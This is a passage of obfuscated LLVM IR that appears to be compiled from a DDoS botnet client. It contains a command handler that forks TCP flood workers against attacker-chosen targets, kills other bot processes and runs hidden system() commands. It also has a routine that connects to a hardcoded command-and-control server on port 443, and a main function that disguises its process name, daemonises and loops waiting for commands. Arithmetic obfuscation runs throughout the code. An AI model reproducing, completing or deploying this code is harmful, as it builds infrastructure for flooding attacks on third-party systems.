  store i32 %695, i32* %40, align 4
  %696 = load i8**, i8*** %4, align 8
  %697 = getelementptr inbounds i8*, i8** %696, i64 3
  %698 = load i8*, i8** %697, align 8
  %699 = call i32 @atoi(i8* %698) #10
  store i32 %699, i32* %41, align 4
  %700 = load i8**, i8*** %4, align 8
  %701 = getelementptr inbounds i8*, i8** %700, i64 4
  %702 = load i8*, i8** %701, align 8
  %703 = call i32 @atoi(i8* %702) #10
  store i32 %703, i32* %42, align 4
  %704 = load i8**, i8*** %4, align 8
  %705 = getelementptr inbounds i8*, i8** %704, i64 5
  %706 = load i8*, i8** %705, align 8
  store i8* %706, i8** %43, align 8
  %707 = load i32, i32* %3, align 4
  %708 = icmp eq i32 %707, 8
  br i1 %708, label %709, label %714

; <label>:709:                                    ; preds = %688
  %710 = load i8**, i8*** %4, align 8
  %711 = getelementptr inbounds i8*, i8** %710, i64 7
  %712 = load i8*, i8** %711, align 8
  %713 = call i32 @atoi(i8* %712) #10
  br label %715

; <label>:714:                                    ; preds = %688
  br label %715

; <label>:715:                                    ; preds = %714, %709
  %716 = phi i32 [ %713, %709 ], [ 10, %714 ]
  store i32 %716, i32* %44, align 4
  %717 = load i32, i32* %3, align 4
  %718 = icmp sgt i32 %717, 6
  br i1 %718, label %719, label %724

; <label>:719:                                    ; preds = %715
  %720 = load i8**, i8*** %4, align 8
  %721 = getelementptr inbounds i8*, i8** %720, i64 6
  %722 = load i8*, i8** %721, align 8
  %723 = call i32 @atoi(i8* %722) #10
  br label %725

; <label>:724:                                    ; preds = %715
  br label %725

; <label>:725:                                    ; preds = %724, %719
  %726 = phi i32 [ %723, %719 ], [ 0, %724 ]
  store i32 %726, i32* %45, align 4
  %727 = load i8*, i8** %39, align 8
  %728 = call i8* @strstr(i8* %727, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #10
  %729 = icmp ne i8* %728, null
  br i1 %729, label %730, label %750

; <label>:730:                                    ; preds = %725
  %731 = load i8*, i8** %39, align 8
  %732 = call i8* @strtok(i8* %731, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %732, i8** %46, align 8
  br label %733

; <label>:733:                                    ; preds = %747, %730
  %734 = load i8*, i8** %46, align 8
  %735 = icmp ne i8* %734, null
  br i1 %735, label %736, label %749

; <label>:736:                                    ; preds = %733
  %737 = call i32 @listFork()
  %738 = icmp ne i32 %737, 0
  br i1 %738, label %747, label %739

; <label>:739:                                    ; preds = %736
  %740 = load i8*, i8** %46, align 8
  %741 = load i32, i32* %40, align 4
  %742 = load i32, i32* %41, align 4
  %743 = load i32, i32* %42, align 4
  %744 = load i8*, i8** %43, align 8
  %745 = load i32, i32* %45, align 4
  %746 = load i32, i32* %44, align 4
  call void @sendTCP(i8* %740, i32 %741, i32 %742, i32 %743, i8* %744, i32 %745, i32 %746)
  call void @_exit(i32 0) #12
  unreachable

; <label>:747:                                    ; preds = %736
  %748 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %748, i8** %46, align 8
  br label %733

; <label>:749:                                    ; preds = %733
  br label %762

; <label>:750:                                    ; preds = %725
  %751 = call i32 @listFork()
  %752 = icmp ne i32 %751, 0
  br i1 %752, label %753, label %754

; <label>:753:                                    ; preds = %750
  br label %828

; <label>:754:                                    ; preds = %750
  %755 = load i8*, i8** %39, align 8
  %756 = load i32, i32* %40, align 4
  %757 = load i32, i32* %41, align 4
  %758 = load i32, i32* %42, align 4
  %759 = load i8*, i8** %43, align 8
  %760 = load i32, i32* %45, align 4
  %761 = load i32, i32* %44, align 4
  call void @sendTCP(i8* %755, i32 %756, i32 %757, i32 %758, i8* %759, i32 %760, i32 %761)
  call void @_exit(i32 0) #12
  unreachable

; <label>:762:                                    ; preds = %749
  br label %763

; <label>:763:                                    ; preds = %762, %636
  %764 = load i8**, i8*** %4, align 8
  %765 = getelementptr inbounds i8*, i8** %764, i64 0
  %766 = load i8*, i8** %765, align 8
  %767 = call i32 @strcmp(i8* %766, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.84, i32 0, i32 0)) #10
  %768 = icmp ne i32 %767, 0
  br i1 %768, label %806, label %769

; <label>:769:                                    ; preds = %763
  store i32 0, i32* %47, align 4
  store i64 0, i64* %48, align 8
  br label %770

; <label>:770:                                    ; preds = %799, %769
  %771 = load i64, i64* %48, align 8
  %772 = load i64, i64* @numpids, align 8
  %773 = icmp ult i64 %771, %772
  br i1 %773, label %774, label %805

; <label>:774:                                    ; preds = %770
  %775 = load i32*, i32** @pids, align 8
  %776 = load i64, i64* %48, align 8
  %777 = getelementptr inbounds i32, i32* %775, i64 %776
  %778 = load i32, i32* %777, align 4
  %779 = icmp ne i32 %778, 0
  br i1 %779, label %780, label %798

; <label>:780:                                    ; preds = %774
  %781 = load i32*, i32** @pids, align 8
  %782 = load i64, i64* %48, align 8
  %783 = getelementptr inbounds i32, i32* %781, i64 %782
  %784 = load i32, i32* %783, align 4
  %785 = call i32 @getpid() #2
  %786 = icmp ne i32 %784, %785
  br i1 %786, label %787, label %798

; <label>:787:                                    ; preds = %780
  %788 = load i32*, i32** @pids, align 8
  %789 = load i64, i64* %48, align 8
  %790 = getelementptr inbounds i32, i32* %788, i64 %789
  %791 = load i32, i32* %790, align 4
  %792 = call i32 @kill(i32 %791, i32 9) #2
  %793 = load i32, i32* %47, align 4
  %794 = sub i32 %793, -1409278554
  %795 = add i32 %794, 1
  %796 = add i32 %795, -1409278554
  %797 = add nsw i32 %793, 1
  store i32 %796, i32* %47, align 4
  br label %798

; <label>:798:                                    ; preds = %787, %780, %774
  br label %799

; <label>:799:                                    ; preds = %798
  %800 = load i64, i64* %48, align 8
  %801 = sub i64 %800, 8602233764962989726
  %802 = add i64 %801, 1
  %803 = add i64 %802, 8602233764962989726
  %804 = add i64 %800, 1
  store i64 %803, i64* %48, align 8
  br label %770

; <label>:805:                                    ; preds = %770
  br label %806

; <label>:806:                                    ; preds = %805, %763
  %807 = load i8**, i8*** %4, align 8
  %808 = getelementptr inbounds i8*, i8** %807, i64 0
  %809 = load i8*, i8** %808, align 8
  %810 = call i32 @strcmp(i8* %809, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.85, i32 0, i32 0)) #10
  %811 = icmp ne i32 %810, 0
  br i1 %811, label %813, label %812

; <label>:812:                                    ; preds = %806
  call void @exit(i32 0) #14
  unreachable

; <label>:813:                                    ; preds = %806
  %814 = load i8**, i8*** %4, align 8
  %815 = getelementptr inbounds i8*, i8** %814, i64 0
  %816 = load i8*, i8** %815, align 8
  %817 = call i32 @strcmp(i8* %816, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.86, i32 0, i32 0)) #10
  %818 = icmp ne i32 %817, 0
  br i1 %818, label %828, label %819

; <label>:819:                                    ; preds = %813
  %820 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.87, i32 0, i32 0))
  %821 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.88, i32 0, i32 0))
  %822 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.89, i32 0, i32 0))
  %823 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.90, i32 0, i32 0))
  %824 = call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.91, i32 0, i32 0))
  %825 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.92, i32 0, i32 0))
  %826 = call i32 @system(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.93, i32 0, i32 0))
  %827 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.94, i32 0, i32 0))
  br label %828

; <label>:828:                                    ; preds = %819, %813, %753, %687, %627, %587, %560, %523, %485, %442, %421, %386, %356, %300, %240, %203, %176, %141, %114, %109, %104, %89, %77, %63, %54
  ret void
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 4096, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = sub i32 %11, 534689560
  %13 = add i32 %12, 1
  %14 = add i32 %13, 534689560
  %15 = add nsw i32 %11, 1
  %16 = sext i32 %14 to i64
  %17 = icmp eq i64 %16, 1
  br i1 %17, label %18, label %19

; <label>:18:                                     ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %25

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* @currentServer, align 4
  %21 = sub i32 %20, -877668423
  %22 = add i32 %21, 1
  %23 = add i32 %22, -877668423
  %24 = add nsw i32 %20, 1
  store i32 %23, i32* @currentServer, align 4
  br label %25

; <label>:25:                                     ; preds = %19, %18
  %26 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %27 = load i32, i32* @currentServer, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %28
  %30 = load i8*, i8** %29, align 8
  %31 = call i8* @strcpy(i8* %26, i8* %30) #2
  store i32 443, i32* %3, align 4
  %32 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %33 = call i8* @strchr(i8* %32, i32 58) #10
  %34 = icmp ne i8* %33, null
  br i1 %34, label %35, label %42

; <label>:35:                                     ; preds = %25
  %36 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %37 = call i8* @strchr(i8* %36, i32 58) #10
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = call i32 @atoi(i8* %38) #10
  store i32 %39, i32* %3, align 4
  %40 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %41 = call i8* @strchr(i8* %40, i32 58) #10
  store i8 0, i8* %41, align 1
  br label %42

; <label>:42:                                     ; preds = %35, %25
  %43 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %43, i32* @mainCommSock, align 4
  %44 = load i32, i32* @mainCommSock, align 4
  %45 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %46 = load i32, i32* %3, align 4
  %47 = call i32 @connectTimeout(i32 %44, i8* %45, i32 %46, i32 30)
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %50, label %49

; <label>:49:                                     ; preds = %42
  store i32 1, i32* %1, align 4
  br label %51

; <label>:50:                                     ; preds = %42
  store i32 0, i32* %1, align 4
  br label %51

; <label>:51:                                     ; preds = %50, %49
  %52 = load i32, i32* %1, align 4
  ret i32 %52
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %0
  store i32 0, i32* %1, align 4
  br label %104

; <label>:16:                                     ; preds = %0
  %17 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 16, i32 4, i1 false)
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.95, i32 0, i32 0)) #2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %21 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i32 0, i32 0
  store i32 %19, i32* %21, align 4
  %22 = call zeroext i16 @htons(i16 zeroext 53) #13
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %2, align 4
  %25 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %26 = call i32 @connect(i32 %24, %struct.sockaddr* %25, i32 16)
  store i32 %26, i32* %4, align 4
  %27 = load i32, i32* %4, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %16
  store i32 0, i32* %1, align 4
  br label %104

; <label>:30:                                     ; preds = %16
  store i32 16, i32* %6, align 4
  %31 = load i32, i32* %2, align 4
  %32 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %33 = call i32 @getsockname(i32 %31, %struct.sockaddr* %32, i32* %6) #2
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %30
  store i32 0, i32* %1, align 4
  br label %104

; <label>:37:                                     ; preds = %30
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %39 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 4
  store i32 %40, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %41 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.96, i32 0, i32 0), i32 0)
  store i32 %41, i32* %7, align 4
  br label %42

; <label>:42:                                     ; preds = %63, %37
  %43 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %44 = load i32, i32* %7, align 4
  %45 = call i8* @fdgets(i8* %43, i32 4096, i32 %44)
  %46 = icmp ne i8* %45, null
  br i1 %46, label %47, label %65

; <label>:47:                                     ; preds = %42
  %48 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %49 = call i8* @strstr(i8* %48, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.97, i32 0, i32 0)) #10
  %50 = icmp ne i8* %49, null
  br i1 %50, label %51, label %63

; <label>:51:                                     ; preds = %47
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %52, i8** %9, align 8
  br label %53

; <label>:53:                                     ; preds = %58, %51
  %54 = load i8*, i8** %9, align 8
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp ne i32 %56, 9
  br i1 %57, label %58, label %61

; <label>:58:                                     ; preds = %53
  %59 = load i8*, i8** %9, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %9, align 8
  br label %53

; <label>:61:                                     ; preds = %53
  %62 = load i8*, i8** %9, align 8
  store i8 0, i8* %62, align 1
  br label %65

; <label>:63:                                     ; preds = %47
  %64 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %64, i8 0, i64 4096, i32 16, i1 false)
  br label %42

; <label>:65:                                     ; preds = %61, %42
  %66 = load i32, i32* %7, align 4
  %67 = call i32 @close(i32 %66)
  %68 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %69 = load i8, i8* %68, align 16
  %70 = icmp ne i8 %69, 0
  br i1 %70, label %71, label %101

; <label>:71:                                     ; preds = %65
  %72 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %73 = bitcast %union.anon.6* %72 to [16 x i8]*
  %74 = getelementptr inbounds [16 x i8], [16 x i8]* %73, i32 0, i32 0
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %76 = call i8* @strcpy(i8* %74, i8* %75) #2
  %77 = load i32, i32* %2, align 4
  %78 = call i32 (i32, i64, ...) @ioctl(i32 %77, i64 35111, %struct.ifreq* %11) #2
  store i32 0, i32* %10, align 4
  br label %79

; <label>:79:                                     ; preds = %94, %71
  %80 = load i32, i32* %10, align 4
  %81 = icmp slt i32 %80, 6
  br i1 %81, label %82, label %100

; <label>:82:                                     ; preds = %79
  %83 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %84 = bitcast %union.anon.7* %83 to %struct.sockaddr*
  %85 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %84, i32 0, i32 1
  %86 = getelementptr inbounds [14 x i8], [14 x i8]* %85, i32 0, i32 0
  %87 = load i32, i32* %10, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8, i8* %86, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = load i32, i32* %10, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %92
  store i8 %90, i8* %93, align 1
  br label %94

; <label>:94:                                     ; preds = %82
  %95 = load i32, i32* %10, align 4
  %96 = sub i32 %95, 460281578
  %97 = add i32 %96, 1
  %98 = add i32 %97, 460281578
  %99 = add nsw i32 %95, 1
  store i32 %98, i32* %10, align 4
  br label %79

; <label>:100:                                    ; preds = %79
  br label %101

; <label>:101:                                    ; preds = %100, %65
  %102 = load i32, i32* %2, align 4
  %103 = call i32 @close(i32 %102)
  br label %104

; <label>:104:                                    ; preds = %101, %36, %29, %15
  %105 = load i32, i32* %1, align 4
  ret i32 %105
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #4

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #4

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.98, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [1024 x i8], align 16
  %20 = alloca i32, align 4
  %21 = alloca [10 x i8*], align 16
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.99, i32 0, i32 0), i8** %6, align 8
  %25 = call i32 @access(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.100, i32 0, i32 0), i32 0) #2
  %26 = icmp ne i32 %25, -1
  br i1 %26, label %27, label %28

; <label>:27:                                     ; preds = %2
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.101, i32 0, i32 0), i8** %6, align 8
  br label %29

; <label>:28:                                     ; preds = %2
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.102, i32 0, i32 0), i8** %6, align 8
  br label %29

; <label>:29:                                     ; preds = %28, %27
  %30 = call i8* @getBuild()
  %31 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.103, i32 0, i32 0), i8* %30)
  %32 = load i8**, i8*** %5, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 0
  %34 = load i8*, i8** %33, align 8
  %35 = load i8**, i8*** %5, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 0
  %37 = load i8*, i8** %36, align 8
  %38 = call i64 @strlen(i8* %37) #10
  %39 = call i8* @strncpy(i8* %34, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.99, i32 0, i32 0), i64 %38) #2
  %40 = load i8**, i8*** %5, align 8
  %41 = getelementptr inbounds i8*, i8** %40, i64 0
  %42 = load i8*, i8** %41, align 8
  %43 = load i8*, i8** %6, align 8
  %44 = call i32 (i8*, i8*, ...) @sprintf(i8* %42, i8* %43) #2
  %45 = load i8*, i8** %6, align 8
  %46 = ptrtoint i8* %45 to i64
  %47 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %46, i32 0, i32 0, i32 0)
  %48 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %49 = call i32 @getpid() #2
  %50 = xor i32 %48, -1
  %51 = and i32 -468821688, %50
  %52 = xor i32 -468821688, -1
  %53 = and i32 %48, %52
  %54 = xor i32 %49, -1
  %55 = and i32 %54, -468821688
  %56 = and i32 %49, %52
  %57 = or i32 %51, %53
  %58 = or i32 %55, %56
  %59 = xor i32 %57, %58
  %60 = xor i32 %48, %49
  call void @srand(i32 %59) #2
  %61 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %62 = call i32 @getpid() #2
  %63 = xor i32 %61, -1
  %64 = and i32 %62, %63
  %65 = xor i32 %62, -1
  %66 = and i32 %61, %65
  %67 = or i32 %64, %66
  %68 = xor i32 %61, %62
  call void @init_rand(i32 %67)
  %69 = call i32 @getOurIP()
  %70 = call i32 @fork() #2
  store i32 %70, i32* %7, align 4
  %71 = icmp ne i32 %70, 0
  br i1 %71, label %72, label %75

; <label>:72:                                     ; preds = %29
  %73 = load i32, i32* %7, align 4
  %74 = call i32 @waitpid(i32 %73, i32* %9, i32 0)
  call void @exit(i32 0) #14
  unreachable

; <label>:75:                                     ; preds = %29
  %76 = load i32, i32* %7, align 4
  %77 = icmp ne i32 %76, 0
  br i1 %77, label %89, label %78

; <label>:78:                                     ; preds = %75
  %79 = call i32 @fork() #2
  store i32 %79, i32* %8, align 4
  %80 = icmp ne i32 %79, 0
  br i1 %80, label %81, label %82

; <label>:81:                                     ; preds = %78
  call void @exit(i32 0) #14
  unreachable

; <label>:82:                                     ; preds = %78
  %83 = load i32, i32* %8, align 4
  %84 = icmp ne i32 %83, 0
  br i1 %84, label %86, label %85

; <label>:85:                                     ; preds = %82
  br label %87

; <label>:86:                                     ; preds = %82
  br label %87

; <label>:87:                                     ; preds = %86, %85
  br label %88

; <label>:88:                                     ; preds = %87
  br label %90

; <label>:89:                                     ; preds = %75
  br label %90

; <label>:90:                                     ; preds = %89, %88
  br label %91

; <label>:91:                                     ; preds = %90
  %92 = call i32 @setsid() #2
  %93 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i32 0, i32 0)) #2
  %94 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  br label %95

; <label>:95:                                     ; preds = %436, %98, %91
  %96 = call i32 @initConnection()
  %97 = icmp ne i32 %96, 0
  br i1 %97, label %98, label %100

; <label>:98:                                     ; preds = %95
  %99 = call i32 @sleep(i32 5)
  br label %95

; <label>:100:                                    ; preds = %95
  %101 = load i32, i32* @mainCommSock, align 4
  %102 = call i8* @getBuild()
  %103 = call i32 (i32, i8*, ...) @sockprintf(i32 %101, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.105, i32 0, i32 0), i8* %102)
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  br label %104

; <label>:104:                                    ; preds = %435, %344, %259, %221, %100
  %105 = load i32, i32* @mainCommSock, align 4
  %106 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %107 = call i32 @recvLine(i32 %105, i8* %106, i32 4096)
  store i32 %107, i32* %11, align 4
  %108 = icmp ne i32 %107, -1
  br i1 %108, label %109, label %436

; <label>:109:                                    ; preds = %104
  store i32 0, i32* %12, align 4
  br label %110

; <label>:110:                                    ; preds = %205, %109
  %111 = load i32, i32* %12, align 4
  %112 = sext i32 %111 to i64
  %113 = load i64, i64* @numpids, align 8
  %114 = icmp ult i64 %112, %113
  br i1 %114, label %115, label %212

; <label>:115:                                    ; preds = %110
  %116 = load i32*, i32** @pids, align 8
  %117 = load i32, i32* %12, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds i32, i32* %116, i64 %118
  %120 = load i32, i32* %119, align 4
  %121 = call i32 @waitpid(i32 %120, i32* null, i32 1)
  %122 = icmp sgt i32 %121, 0
  br i1 %122, label %123, label %204

; <label>:123:                                    ; preds = %115
  %124 = load i32, i32* %12, align 4
  %125 = sub i32 0, %124
  %126 = sub i32 0, 1
  %127 = add i32 %125, %126
  %128 = sub i32 0, %127
  %129 = add nsw i32 %124, 1
  store i32 %128, i32* %14, align 4
  br label %130

; <label>:130:                                    ; preds = %149, %123
  %131 = load i32, i32* %14, align 4
  %132 = zext i32 %131 to i64
  %133 = load i64, i64* @numpids, align 8
  %134 = icmp ult i64 %132, %133
  br i1 %134, label %135, label %156

; <label>:135:                                    ; preds = %130
  %136 = load i32*, i32** @pids, align 8
  %137 = load i32, i32* %14, align 4
  %138 = zext i32 %137 to i64
  %139 = getelementptr inbounds i32, i32* %136, i64 %138
  %140 = load i32, i32* %139, align 4
  %141 = load i32*, i32** @pids, align 8
  %142 = load i32, i32* %14, align 4
  %143 = add i32 %142, -1389857671
  %144 = sub i32 %143, 1
  %145 = sub i32 %144, -1389857671
  %146 = sub i32 %142, 1
  %147 = zext i32 %145 to i64
  %148 = getelementptr inbounds i32, i32* %141, i64 %147
  store i32 %140, i32* %148, align 4
  br label %149

; <label>:149:                                    ; preds = %135
  %150 = load i32, i32* %14, align 4
  %151 = sub i32 0, %150
  %152 = sub i32 0, 1
  %153 = add i32 %151, %152
  %154 = sub i32 0, %153
  %155 = add i32 %150, 1
  store i32 %154, i32* %14, align 4
  br label %130

; <label>:156:                                    ; preds = %130
  %157 = load i32*, i32** @pids, align 8
  %158 = load i32, i32* %14, align 4
  %159 = sub i32 %158, -751381918
  %160 = sub i32 %159, 1
  %161 = add i32 %160, -751381918
  %162 = sub i32 %158, 1
  %163 = zext i32 %161 to i64
  %164 = getelementptr inbounds i32, i32* %157, i64 %163
  store i32 0, i32* %164, align 4
  %165 = load i64, i64* @numpids, align 8
  %166 = add i64 %165, 2550538971189380218
  %167 = add i64 %166, -1
  %168 = sub i64 %167, 2550538971189380218
  %169 = add i64 %165, -1
  store i64 %168, i64* @numpids, align 8
  %170 = load i64, i64* @numpids, align 8
  %171 = sub i64 0, %170
  %172 = sub i64 0, 1
  %173 = add i64 %171, %172
  %174 = sub i64 0, %173
  %175 = add i64 %170, 1
  %176 = mul i64 %174, 4
  %177 = call noalias i8* @malloc(i64 %176) #2
  %178 = bitcast i8* %177 to i32*
  store i32* %178, i32** %13, align 8
  store i32 0, i32* %14, align 4
  br label %179

; <label>:179:                                    ; preds = %194, %156
  %180 = load i32, i32* %14, align 4
  %181 = zext i32 %180 to i64
  %182 = load i64, i64* @numpids, align 8
  %183 = icmp ult i64 %181, %182
  br i1 %183, label %184, label %200

; <label>:184:                                    ; preds = %179
  %185 = load i32*, i32** @pids, align 8
  %186 = load i32, i32* %14, align 4
  %187 = zext i32 %186 to i64
  %188 = getelementptr inbounds i32, i32* %185, i64 %187
  %189 = load i32, i32* %188, align 4
  %190 = load i32*, i32** %13, align 8
  %191 = load i32, i32* %14, align 4
  %192 = zext i32 %191 to i64
  %193 = getelementptr inbounds i32, i32* %190, i64 %192
  store i32 %189, i32* %193, align 4
  br label %194

; <label>:194:                                    ; preds = %184
  %195 = load i32, i32* %14, align 4
  %196 = sub i32 %195, -799570531
  %197 = add i32 %196, 1
  %198 = add i32 %197, -799570531
  %199 = add i32 %195, 1
  store i32 %198, i32* %14, align 4
  br label %179

; <label>:200:                                    ; preds = %179
  %201 = load i32*, i32** @pids, align 8
  %202 = bitcast i32* %201 to i8*
  call void @free(i8* %202) #2
  %203 = load i32*, i32** %13, align 8
  store i32* %203, i32** @pids, align 8
  br label %204

; <label>:204:                                    ; preds = %200, %115
  br label %205

; <label>:205:                                    ; preds = %204
  %206 = load i32, i32* %12, align 4
  %207 = sub i32 0, %206
  %208 = sub i32 0, 1
  %209 = add i32 %207, %208
  %210 = sub i32 0, %209
  %211 = add nsw i32 %206, 1
  store i32 %210, i32* %12, align 4
  br label %110

; <label>:212:                                    ; preds = %110
  %213 = load i32, i32* %11, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %214
  store i8 0, i8* %215, align 1
  %216 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
